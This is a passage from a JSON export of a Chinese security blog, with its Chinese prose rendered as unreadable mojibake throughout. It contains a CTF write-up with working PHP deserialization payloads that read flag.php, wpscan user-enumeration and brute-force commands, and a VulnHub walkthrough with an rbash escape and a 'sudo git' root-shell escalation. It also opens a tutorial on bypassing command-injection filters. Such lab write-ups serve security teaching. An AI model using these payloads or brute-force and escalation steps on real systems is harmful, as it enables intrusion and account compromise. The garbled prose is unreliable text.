if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; å…ˆçœ‹ä¸€ä¸‹ä»£ç å¤§ä½“æ€è·¯ï¼Œé¦–å…ˆåˆ¤æ–­ååºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆè§„åˆ™ï¼Œç¬¦åˆåˆ™ååºåˆ—åŒ–ï¼Œé¦–å…ˆè¿›å…¥__destruct()å‡½æ•°ï¼Œé¦–å…ˆåˆ¤æ–­$this-&gt;opå‚æ•°çš„å€¼ï¼Œç„¶åå°†$this-&gt;contentè®¾ç½®ä¸ºç©ºï¼Œæœ€åè¿›å…¥$this-&gt;process()ï¼Œæ ¹æ®$this-&gt;opçš„å€¼åˆ¤æ–­è¿›è¡Œå†™è¿˜æ˜¯è¯»æ“ä½œ å¾ˆæ˜æ˜¾å†™æ–‡ä»¶å·²ç»ä¸å¯èƒ½äº†ï¼Œå› ä¸ºæŠŠæ–‡ä»¶å†…å®¹è®¾ç½®ä¸ºç©ºäº†ï¼Œæ‰€ä»¥çœ‹çœ‹è¯»æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°__destruct()é‡Œåˆ¤æ–­$this-&gt;opç”¨çš„æ˜¯===ï¼Œè€Œ process()æ–¹æ³•é‡Œçš„æ¯”è¾ƒç”¨çš„æ˜¯==ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡: 123&quot;2&quot;==2&quot;2&quot;==&quot;2e0&quot;&quot;2&quot;==&quot; 2e0&quot; æœ€åå°±è¿›å…¥äº†$this-&gt;read()ï¼Œä½†æ˜¯ç”±äºå„å‚æ•°éƒ½æ˜¯protectedç±»å‹ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²æœ‰\\x00,æ‰€ä»¥æ— æ³•pass is_validå‡½æ•°ï¼Œphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥ç›´æ¥ç”¨publicç»•è¿‡ï¼Œæˆ–è€…å°†sæ›¿æ¢æˆSï¼Œå¹¶æŠŠ\\x00æ›¿æ¢æˆ\\00ï¼ŒåŸç†å¯ä»¥å‚è§ï¼š https://github.com/ambionics/phpggc æ„é€ expï¼ŒF12å¾—åˆ°flag: 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass FileHandler &#123; public $op; public $filename; public $content;&#125;$a = new FileHandler();$a-&gt;op = 2;$a-&gt;filename = &quot;flag.php&quot;;$a-&gt;content = &quot;Hello World!&quot;;echo serialize($a);?&gt; &lt;?phpclass FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $this-&gt;op = 2; $this-&gt;filename = &quot;flag.php&quot;; $this-&gt;content = &quot;Hello World!&quot;; &#125;&#125;$a = new FileHandler();$s = serialize($a);$s = str_replace(chr(0),&#x27;\\00&#x27;,$s);$s = str_replace(&#x27;s:&#x27;,&#x27;S:&#x27;,$s);echo $s;// O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\\00*\\00content&quot;;S:12:&quot;Hello World!&quot;;&#125;// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;&#125;// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:13:&quot;Hello World!&quot;;&#125; ä¸Šé¢å››ä¸ªpayloadéƒ½èƒ½è¯»åˆ°flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://www.m00nback.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.m00nback.xyz/tags/buuctf/"}]},{"title":"wpscanå­¦ä¹ ä½¿ç”¨","slug":"wpscanå­¦ä¹ ä½¿ç”¨","date":"2020-01-11T08:47:41.000Z","updated":"2020-01-16T08:04:31.107Z","comments":true,"path":"2020/01/11/wpscanå­¦ä¹ ä½¿ç”¨/","link":"","permalink":"http://www.m00nback.xyz/2020/01/11/wpscan%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†wordpressæ¼æ´æ‰«æå·¥å…·wpscançš„ä½¿ç”¨!","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†wordpressæ¼æ´æ‰«æå·¥å…·wpscançš„ä½¿ç”¨! ä»€ä¹ˆæ˜¯wpscan?ä»‹ç»wpscanä¹‹å‰åº”è¯¥å…ˆä»‹ç»ä¸€ä¸‹wordpress! Wordpressä½œä¸ºä¸‰å¤§å»ºç«™æ¨¡æ¿ä¹‹ä¸€ï¼Œåœ¨å…¨ä¸–ç•ŒèŒƒå›´å†…æœ‰å¤§é‡çš„ç”¨æˆ·,è¿™ä¹Ÿå¯¼è‡´ç™½å¸½å­éƒ½ä¼šå»è·Ÿè¸ª WordPressçš„å®‰å…¨é—®é¢˜ï¼ŒWordpressè‡ªè¯ç”Ÿèµ·å‡ºç°äº†å¾ˆå¤šæ¼æ´ï¼ŒåŒæ ·éƒ¨åˆ†æ’ä»¶ã€ä¸»é¢˜ä¹Ÿå­˜åœ¨æ¼æ´ã€‚äºæ˜¯WPScanåº”è¿è€Œç”Ÿï¼Œæ”¶é›† Wordpressçš„å„ç§æ¼æ´ï¼Œå½¢æˆä¸€ä¸ªWordpressä¸“ç”¨æ‰«æå™¨ã€‚ è¯¥æ‰«æå™¨å¯ä»¥å®ç°è·å–ç«™ç‚¹ç”¨æˆ·åï¼Œè·å–å®‰è£…çš„æ‰€æœ‰æ’ä»¶ã€ä¸»é¢˜ï¼Œä»¥åŠå­˜åœ¨æ¼æ´çš„æ’ä»¶ã€ä¸»é¢˜ï¼Œå¹¶æä¾›æ¼æ´ä¿¡æ¯ã€‚åŒæ—¶è¿˜å¯ä»¥å®ç°å¯¹æœªåŠ é˜²æŠ¤çš„Wordpressç«™ç‚¹æš´åŠ›ç ´è§£ç”¨æˆ·åå¯†ç ã€‚ kalié‡Œé»˜è®¤é›†æˆè¯¥å·¥å…· ä½¿ç”¨åŸºæœ¬æ“ä½œ12wpscan --update #æ›´æ–°æ¼æ´åº“wpscan -h #æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ ç«™ç‚¹æ‰«æ1wpscan --url [wordpress url] #å¯¹wordpressç«™ç‚¹æ‰«æ æšä¸¾ç”¨æˆ·12wpscan --url [wordpress url] --enumerate u #æšä¸¾ç”¨æˆ·åˆ—è¡¨ï¼Œ--enumerateå¯ç”¨-uä»£æ›¿wpscan --url [wordpress url] -P [path to wordlist] -U [username to brute force] #æš´åŠ›ç ´è§£æŒ‡å®šç”¨æˆ·åçš„å¯†ç ï¼Œå¯åŠ -tæŒ‡å®šçº¿ç¨‹,--ruaéšæœºUAå¤´ æšä¸¾ä¸»é¢˜123wpscan --url [wordpress url] --enumerate t #æ‰«æä¸»é¢˜wpscan --url [wordpress url] --enumerate vt #æ‰«æä¸»é¢˜æ¼æ´wpscan --url [wordpress url] --enumerate at #æ‰«ææ‰€æœ‰ä¸»é¢˜ æšä¸¾æ’ä»¶123wpscan --url [wordpress url] --enumerate p #æ‰«ææ’ä»¶wpscan --url [wordpress url] --enumerate vp #æ‰«ææ’ä»¶æ¼æ´wpscan --url [wordpress url] --enumerate ap #æ‰«ææ‰€æœ‰æ’ä»¶","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"wpscan","slug":"wpscan","permalink":"http://www.m00nback.xyz/tags/wpscan/"},{"name":"wordpress","slug":"wordpress","permalink":"http://www.m00nback.xyz/tags/wordpress/"}]},{"title":"VulnHubä¹‹DC-2é¶æœº","slug":"vulnhub-dc-2","date":"2020-01-01T14:07:31.000Z","updated":"2020-01-12T10:20:10.460Z","comments":true,"path":"2020/01/01/vulnhub-dc-2/","link":"","permalink":"http://www.m00nback.xyz/2020/01/01/vulnhub-dc-2/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç©DC-2é¶æœºçš„è¿‡ç¨‹!","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç©DC-2é¶æœºçš„è¿‡ç¨‹! kaliï¼š192.168.17.146 é¶æœºï¼š192.168.17.131 flag1è¿™ä¸ªé¶æœºéœ€è¦å°†dc-2çš„åŸŸåæŒ‡å‘å¯¹åº”é¶æœºip é¦–å…ˆarp-scan æ”¹ä¸‹/etc/hostsæ–‡ä»¶ ç›´æ¥è®¿é—®dc-2åŸŸåï¼Œå¾—åˆ°flag1 flag2flag1æç¤ºç”¨cewlç”Ÿæˆå­—å…¸çˆ†ç ´å°±ä¼šçœ‹åˆ°ä¸‹ä¸€ä¸ªflagï¼Œé¦–å…ˆæšä¸¾ä¸€ä¸‹ç”¨æˆ·ï¼Œæšä¸¾å‡ºä¸‰ä¸ªç”¨æˆ· 1wpscan --url http://dc-2/ -e u ç”¨cewlç”Ÿæˆå­—å…¸ï¼Œcewlæœ‰å¾ˆå¤šç”¨æ³•ï¼Œå‚è§https://www.freebuf.com/articles/network/190128.html 1cewl http://dc-2 -w a.txt ç„¶åç”¨wpscançˆ†ç ´ï¼Œåˆ†åˆ«å°†ç”¨æˆ·åå’Œå¯†ç æ”¾åˆ°ä¸¤ä¸ªæ–‡ä»¶é‡Œ 1wpscan --url http://dc-2 --passwords /root/Desktop/a.txt --usernames /root/Desktop/b.txt -t 100 è·‘å‡ºæ¥ä¸¤ä¸ªè´¦å·å¯†ç ï¼Œç™»é™†ä¸€ä¸‹,æ‰¾åˆ°flag2 flag3nmapæ‰«æä¸»æœºå‘ç°7744ç«¯å£å¼€æ”¾ç€æœåŠ¡ï¼Œæ¢æµ‹æœåŠ¡æ˜¯sshï¼Œç™»é™†è¯•ä¸€ä¸‹å§ ç™»é™†jerryå¥½åƒç™»ä¸ä¸Šï¼Œæ¢æˆtomç™»ä¸Šäº†ï¼Œlsçœ‹åˆ°flag3.txt å‘ç°catä¸äº†ï¼Œrbashæ˜¯ä¸€ç§å—é™åˆ¶çš„shellï¼Œå—é™åˆ¶çš„shellæ˜¯é™åˆ¶äº†ä¸€ä¸ªshellçš„éƒ¨åˆ†å‘½ä»¤,åƒcdã€lsã€echo,æˆ–è€…æ˜¯é™åˆ¶äº†ä¸€äº›ç¯å¢ƒå˜é‡,è¯¸å¦‚SHELLã€PATHã€USERã€‚æˆ–è€…é™åˆ¶ä¸€äº›è¾“å‡ºç¬¦,åƒ&gt;ã€&gt;&gt;ç­‰ å› æ­¤ï¼Œæƒ³åŠæ³•åˆ‡æ¢ä¸€ä¸‹shell 123BASH_CMDS[a]=/bin/sh;a #åˆ‡æ¢shellexport PATH=$PATH:/bin/ #æ·»åŠ $PATHï¼Œcatå’Œsuéƒ½åœ¨/binä¸‹export PATH=$PATH:/usr/bin #sudoåœ¨/usr/binä¸‹ flag4ä»flag3å¯ä»¥çœ‹å‡ºæ¥ï¼Œflag4åº”è¯¥åœ¨jerryç”¨æˆ·homeé‡Œ thefinalflagflag4æç¤ºæˆ‘ä»¬ç”¨gitï¼Œåˆ‡æ¢ç”¨æˆ·å‘ç°jerryå¯ä»¥ç›´æ¥ä½¿ç”¨git 12sudo git -p --help #æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯!/bin/bash","categories":[],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://www.m00nback.xyz/tags/VulnHub/"},{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://www.m00nback.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"å‘½ä»¤æ³¨å…¥åŠå…¶ç»•è¿‡æ–¹å¼","slug":"command-exec-bypass","date":"2019-12-31T02:30:56.000Z","updated":"2020-01-16T10:04:04.594Z","comments":true,"path":"2019/12/31/command-exec-bypass/","link":"","permalink":"http://www.m00nback.xyz/2019/12/31/command-exec-bypass/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å‘½ä»¤æ³¨å…¥ä¸­çš„ä¸€äº›ç»•è¿‡æ–¹å¼ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å‘½ä»¤æ³¨å…¥ä¸­çš„ä¸€äº›ç»•è¿‡æ–¹å¼ï¼ ç‰¹æ®Šç¬¦å·|ç®¡é“ç¬¦ï¼Œè¿ç»“ä¸Šä¸ªæŒ‡ä»¤çš„æ ‡å‡†è¾“å‡ºï¼Œåšä¸ºä¸‹ä¸ªæŒ‡ä»¤çš„æ ‡å‡†è¾“å…¥ &amp;ç”¨æˆ·æœ‰æ—¶å€™æ‰§è¡Œå‘½ä»¤è¦èŠ±å¾ˆé•¿æ—¶é—´ï¼Œå¯èƒ½ä¼šå½±å“åšå…¶ä»–äº‹æƒ…ã€‚æœ€å¥½çš„æ–¹æ³•æ˜¯å°†å®ƒæ”¾åœ¨åå°æ‰§è¡Œã€‚åå°è¿è¡Œçš„ç¨‹åºåœ¨ç”¨æˆ·æ³¨é”€åç³»ç»Ÿè¿˜å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚å½“è¦æŠŠå‘½ä»¤æ”¾åœ¨åå°æ‰§è¡Œæ—¶ï¼Œåœ¨å‘½ä»¤çš„åé¢åŠ ä¸Š&amp; &amp;&amp;å’Œ||shellåœ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œä¼šè¿”å›ä¸€ä¸ªè¿”å›å€¼ï¼Œè¯¥è¿”å›å€¼ä¿å­˜åœ¨shellå˜é‡ $? ä¸­ã€‚å½“ $? == 0 æ—¶ï¼Œè¡¨ç¤ºæ‰§è¡ŒæˆåŠŸï¼›å½“ $? == 1 æ—¶ï¼Œè¡¨ç¤ºæ‰§è¡Œå¤±è´¥ã€‚æœ‰æ—¶å€™ï¼Œä¸‹ä¸€æ¡å‘½ä»¤ä¾èµ–å‰ä¸€æ¡å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚å¦‚ï¼šåœ¨æˆåŠŸåœ°æ‰§è¡Œä¸€æ¡å‘½ä»¤ä¹‹åå†æ‰§è¡Œå¦ä¸€æ¡å‘½ä»¤ï¼Œæˆ–è€…åœ¨ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åå†æ‰§è¡Œå¦ä¸€æ¡å‘½ä»¤ç­‰ã€‚shellæä¾›äº†&amp;&amp;å’Œ||æ¥å®ç°å‘½ä»¤æ‰§è¡Œæ§åˆ¶çš„åŠŸèƒ½ï¼Œshellå°†æ ¹æ®&amp;&amp;æˆ–||å‰é¢å‘½ä»¤çš„è¿”å›å€¼æ¥æ§åˆ¶å…¶åé¢å‘½ä»¤çš„æ‰§è¡Œ &amp;&amp;1command1 &amp;&amp; command2 [&amp;&amp; command3 ...] å‘½ä»¤ä¹‹é—´ä½¿ç”¨ &amp;&amp; è¿æ¥ï¼Œå®ç°é€»è¾‘ä¸çš„åŠŸèƒ½ã€‚ åªæœ‰åœ¨&amp;&amp;å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œ&amp;&amp;å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œ åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œ ||1command1 || command2 [|| command3 ...] å‘½ä»¤ä¹‹é—´ä½¿ç”¨ || è¿æ¥ï¼Œå®ç°é€»è¾‘æˆ–çš„åŠŸèƒ½ã€‚ åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œ||å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œã€‚è¿™å’Œcè¯­è¨€ä¸­çš„é€»è¾‘æˆ–è¯­æ³•åŠŸèƒ½ç›¸åŒï¼Œå³å®ç°çŸ­è·¯é€»è¾‘æˆ–æ“ä½œã€‚ åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œã€‚ `åå¼•å·å‘½ä»¤æ›¿ä»£ï¼Œå¤§éƒ¨åˆ†Unix shellä»¥åŠç¼–ç¨‹è¯­è¨€å¦‚Perlã€PHPä»¥åŠRubyç­‰éƒ½ä»¥æˆå¯¹çš„é‡éŸ³ç¬¦(åå¼•å·)ä½œæŒ‡ä»¤æ›¿ä»£ï¼Œæ„æ€æ˜¯ä»¥æŸä¸€ä¸ªæŒ‡ä»¤çš„è¾“å‡ºç»“æœä½œä¸ºå¦ä¸€ä¸ªæŒ‡ä»¤çš„è¾“å…¥é¡¹ â€˜å•å¼•å·è¢«å•å¼•å·æ‹¬ä½çš„å†…å®¹,å°†è¢«è§†ä¸ºå•ä¸€å­—ç¬¦ä¸²ã€‚åœ¨å¼•å·å†…çš„å˜é‡$ç¬¦å·å°†ä¼šå¤±æ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå°†è¢«è§†ä½œä¸€èˆ¬ç¬¦å·å¤„ç†ã€‚ â€œåŒå¼•å·è¢«åŒå¼•å·æ‹¬ä½çš„å†…å®¹ï¼Œå°†è¢«è§†ä¸ºå•ä¸€å­—ç¬¦ä¸²ï¼Œé˜²æ­¢é€šé…ç¬¦çš„æ‰©å±•ï¼Œä½†å…è®¸å˜é‡æ‰©å±• ï¼Œè¿™ç‚¹ä¸å•å¼•å·çš„å¤„ç†æ–¹å¼ä¸åŒ ()æŒ‡ä»¤ç¾¤ç»„æ ¼å¼ä¸ºï¼š(command1;command2[;command3â€¦]) ä¸€æ¡å‘½ä»¤éœ€è¦ç‹¬å ä¸€ä¸ªç‰©ç†è¡Œï¼Œå¦‚æœéœ€è¦å°†å¤šæ¡å‘½ä»¤æ”¾åœ¨åŒä¸€è¡Œï¼Œå‘½ä»¤ä¹‹é—´ä½¿ç”¨å‘½ä»¤åˆ†éš”ç¬¦ï¼ˆ;ï¼‰åˆ†éš”ã€‚æ‰§è¡Œçš„æ•ˆæœç­‰åŒäºå¤šä¸ªç‹¬ç«‹çš„å‘½ä»¤å•ç‹¬æ‰§è¡Œçš„æ•ˆæœã€‚ è¡¨ç¤ºåœ¨å½“å‰ shell ä¸­å°†å¤šä¸ªå‘½ä»¤ä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ () æ‹¬èµ·æ¥çš„å‘½ä»¤åœ¨æ‰§è¡Œå‰é¢éƒ½ä¸ä¼šåˆ‡æ¢å½“å‰å·¥ä½œç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´å‘½ä»¤ç»„åˆéƒ½æ˜¯åœ¨å½“å‰å·¥ä½œç›®å½•ä¸‹è¢«æ‰§è¡Œçš„ï¼Œå°½ç®¡å‘½ä»¤ä¸­æœ‰åˆ‡æ¢ç›®å½•çš„å‘½ä»¤ã€‚ å‘½ä»¤ç»„åˆå¸¸å’Œå‘½ä»¤æ‰§è¡Œæ§åˆ¶ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚ ç”¨æ‹¬å·å°†ä¸€ä¸²è¿ç»­æŒ‡ä»¤æ‹¬èµ·æ¥ï¼Œè¿™ç§ç”¨æ³•å¯¹shellæ¥è¯´ï¼Œç§°ä¸ºæŒ‡ä»¤ç¾¤ç»„ã€‚å¦‚ä¸‹é¢çš„ä¾‹å­: 1(cd ~ ; vcgh=`pwd` ;echo $vcgh) {}å¤§æ‹¬å·å…¶å®å¤§æ‹¬å·æœ‰ä¸€ç§æ‹¼æ¥å­—ç¬¦ä¸²çš„ç”¨æ³•ï¼Œ&#123;xx,yy,zz,...&#125;è¿™ç§å¤§æ‹¬å·çš„ç»„åˆï¼Œå¸¸ç”¨åœ¨å­—ä¸²çš„ç»„åˆä¸Šï¼Œæ¥çœ‹ä¸ªä¾‹å­ 1mkdir &#123;userA,userB,userC&#125;-&#123;home,bin,data&#125; æˆ‘ä»¬å¾—åˆ°userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-dataæ–‡ä»¶å¤¹ã€‚ äºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨æ¥æŸ¥çœ‹flag: 12345$ cat &#123;/fl,/fla&#125;&#123;ag,g&#125;flag&#123;xxx&#125;cat: /flg: No such file or directorycat: /flaag: No such file or directoryflag&#123;xxx&#125; []ä¸­æ‹¬å·è¿™ä¸ªç¬¦å·åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ‹…ä»»ç±»ä¼¼ â€œèŒƒå›´â€ æˆ– â€œé›†åˆâ€ çš„è§’è‰²ã€‚ å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«é‚£ä¹ˆï¼Œä¸‹é¢åˆæ¶‰åŠåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«ã€‚ å•å°æ‹¬å·ï¼Œ(cmd1;cmd2;cmd3) æ–°å¼€ä¸€ä¸ªå­shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¯ä»¥æ²¡æœ‰åˆ†å·ã€‚æŠŠcommand groupæ”¾åœ¨subshellå»æ‰§è¡Œï¼Œä¹Ÿå«åšnested sub-shellã€‚ å•å¤§æ‹¬å·ï¼Œ{ cmd1;cmd2;cmd3;} åœ¨å½“å‰shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¿…é¡»æœ‰åˆ†å·, ç¬¬ä¸€æ¡å‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»ç”¨ç©ºæ ¼éš”å¼€ã€‚èŠ±æ‹¬å·æ˜¯åœ¨åŒä¸€ä¸ª shell å…§å®Œæˆï¼Œä¹Ÿç§°ä¸º non-namedcommand groupã€‚ æ‰€ä»¥è¯´ï¼Œå¦‚æœåœ¨shellé‡Œé¢æ‰§è¡Œâ€œå‡½æ•°â€ï¼Œéœ€è¦ç”¨åˆ°{}ï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯ä¸€ä¸ªå‘½ä»¤ç¾¤ç»„ä¹ˆã€‚ä¸è¿‡ï¼Œæ ¹æ®å®æµ‹ï¼Œtest=$(ls -a)å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯test=$&#123;lsâ€“a&#125;è¯­æ³•ä¸Šé¢æ˜¯æœ‰é”™è¯¯çš„ã€‚ä¼°è®¡ä¹Ÿå’Œä¸Šé¢æ‰€è¯´çš„åŸå› æœ‰å…³ã€‚ å¦å¤–ï¼Œä»ç½‘ä¸Šæ‘˜å½•çš„åŒºåˆ«å¦‚ä¸‹ï¼š ()åªæ˜¯å¯¹ä¸€ä¸²å‘½ä»¤é‡æ–°å¼€ä¸€ä¸ªå­shellè¿›è¡Œæ‰§è¡Œ {}å¯¹ä¸€ä¸²å‘½ä»¤åœ¨å½“å‰shellæ‰§è¡Œ ()å’Œ{}éƒ½æ˜¯æŠŠä¸€ä¸²çš„å‘½ä»¤æ”¾åœ¨æ‹¬å·é‡Œé¢ï¼Œå¹¶ä¸”å‘½ä»¤ä¹‹é—´ç”¨;å·éš”å¼€ ()æœ€åä¸€ä¸ªå‘½ä»¤å¯ä»¥ä¸ç”¨åˆ†å· {}æœ€åä¸€ä¸ªå‘½ä»¤è¦ç”¨åˆ†å· {}çš„ç¬¬ä¸€ä¸ªå‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼ ()é‡Œçš„å„å‘½ä»¤ä¸å¿…å’Œæ‹¬å·æœ‰ç©ºæ ¼ ()å’Œ{}ä¸­æ‹¬å·é‡Œé¢çš„æŸä¸ªå‘½ä»¤çš„é‡å®šå‘åªå½±å“è¯¥å‘½ä»¤ï¼Œä½†æ‹¬å·å¤–çš„é‡å®šå‘åˆ™å½±å“åˆ°æ‹¬å·é‡Œçš„æ‰€æœ‰å‘½ä»¤ è¿™é‡Œå¼•å‡ºæ¥[..]å’Œ[[...]]çš„åŒºåˆ«ï¼šä½¿ç”¨[[...]]æ¡ä»¶åˆ¤æ–­ç»“æ„, è€Œä¸æ˜¯[...], èƒ½å¤Ÿé˜²æ­¢è„šæœ¬ä¸­çš„è®¸å¤šé€»è¾‘é”™è¯¯.æ¯”å¦‚&amp;&amp;,||,&lt;,å’Œ&gt; æ“ä½œç¬¦èƒ½å¤Ÿæ­£å¸¸å­˜åœ¨äº[[ ]]æ¡ä»¶åˆ¤æ–­ç»“æ„ä¸­, ä½†æ˜¯å¦‚æœå‡ºç°åœ¨[]ç»“æ„ä¸­çš„è¯ï¼Œä¼šæŠ¥é”™ã€‚ å¯¹&#123;&#125;å’Œ()è€Œè¨€, æ‹¬å·ä¸­çš„é‡å®šå‘ç¬¦åªå½±å“è¯¥æ¡å‘½ä»¤ï¼Œ è€Œæ‹¬å·å¤–çš„é‡å®šå‘ç¬¦å½±å“åˆ°æ‹¬å·ä¸­çš„æ‰€æœ‰å‘½ä»¤ã€‚ è¾“å…¥è¾“å‡º/é‡å®šå‘1&gt; &gt;&gt; &lt; &lt;&lt; :&gt; &amp;&gt; 2&amp;&gt; 2&lt;&gt;&gt;&amp; &gt;&amp;2 æ–‡ä»¶æè¿°ç¬¦(File Descriptor)ï¼Œç”¨ä¸€ä¸ªæ•°å­—ï¼ˆé€šå¸¸ä¸º0-9ï¼‰æ¥è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶ã€‚ æ–‡ä»¶æè¿°ç¬¦ åç§° å¸¸ç”¨ç¼©å†™ é»˜è®¤å€¼ 0 æ ‡å‡†è¾“å…¥ stdin é”®ç›˜ 1 æ ‡å‡†è¾“å‡º stdout å±å¹• 2 æ ‡å‡†é”™è¯¯è¾“å‡º stderr å±å¹• æˆ‘ä»¬åœ¨ç®€å•åœ°ç”¨&lt;æˆ–&gt;æ—¶ï¼Œç›¸å½“äºä½¿ç”¨0&lt;æˆ–1&gt;ï¼ˆä¸‹é¢ä¼šè¯¦ç»†ä»‹ç»ï¼‰ã€‚ cmd &gt; fileæŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ã€‚å¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºåŸæœ‰æ–‡ä»¶ï¼Œä½¿ç”¨bashçš„noclobberé€‰é¡¹å¯ä»¥é˜²æ­¢å¤ç›–åŸæœ‰æ–‡ä»¶ã€‚ cmd &gt;&gt; fileæŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ï¼Œå¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æŠŠä¿¡æ¯åŠ åœ¨åŸæœ‰æ–‡ä»¶åé¢ã€‚ cmd &lt; fileä½¿cmdå‘½ä»¤ä»fileè¯»å…¥ cmd &lt;&lt; 